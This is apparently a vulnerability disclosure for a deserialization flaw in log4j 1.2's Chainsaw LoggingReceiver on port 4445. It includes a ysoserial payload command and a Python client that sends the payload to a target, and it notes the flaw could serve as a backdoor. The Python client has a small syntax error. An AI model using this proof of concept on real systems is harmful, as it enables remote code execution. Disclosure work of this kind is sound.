https://logging.apache.org/log4j/1.2/

Attackers can send malicious data to port 4445 monitored by log4j to deserialize.


Unlike CVE-2019-17571, the vulnerability I found is located in class LoggingReceiver `org.apache.log4j.chainsaw.LoggingReceiver` .
(According to the disclosed CVE-2019-17571 vulnerability details, the location of his vulnerability occurred at org.apache.log4j.net.SocketNode). 

Vulnerability analysis:
Set the listening port in the setupReceiver method on line 133 of src/main/java/org/apache/log4j/chainsaw/Main.java

```java
private void setupReceiver(MyTableModel aModel) {
        int port = 4445;
        String strRep = System.getProperty("chainsaw.port");
        if (strRep != null) {
            try {
                port = Integer.parseInt(strRep);
            } catch (NumberFormatException var6) {
                LOG.fatal("Unable to parse chainsaw.port property with value "+ strRep + ".");
                JOptionPane.showMessageDialog(this, "Unable to parse port number from'" + strRep + "', quitting.", "CHAINSAW", 0);
                System.exit(1);
            }
        }

```
Then go to the LoggingReceiver class to process related connection information:
```java
try {
            LoggingReceiver lr = new LoggingReceiver(aModel, port);
            lr.start();

```
Follow up LoggingReceiver class,get the data in the run method, encapsulate the mClient data into the ObjectInputStream object, Deserializing the ois object triggers the vulnerability:
src/main/java/org/apache/log4j/chainsaw/LoggingReceiver.java
```java

public void run() {
            LoggingReceiver.LOG.debug("Starting to get data");

            try {
                ObjectInputStream ois = new ObjectInputStream(this.mClient.getInputStream());

                while(true) {
                    LoggingEvent event = (LoggingEvent)ois.readObject();
                    LoggingReceiver.this.mModel.addEvent(new EventDetails(event));
                }

```


Vulnerability verification:
Start the visualization component
```bash
java -cp log4j-1.2.17.jar org.apache.log4j.chainsaw.Main
```
Sending the payload generated by ysoserial (https://github.com/angelwhu/ysoserial) to port 4445 of the target can trigger the vulnerability.

eg, generate malicious data exp.ser first:

```bash
java -jar ysoserial.jar Jdk7u21 "calc" > exp.ser
```

Write a python socket client after generating the data:

exp.py:
```python
#coding:utf-8
import socket
s = socket.socket()
host = "172.20.10.14"#target ip
port = 4445#The listening port set by the component
s.connect((host,port))
ssss = open("exp.ser",'rb')//Malicious data
xc = ssss.read()
s.send(xc)
s.close()
```
running exp.py can trigger the vulnerability.




Attackers can use this vulnerability as a backdoor to maintain permissions.
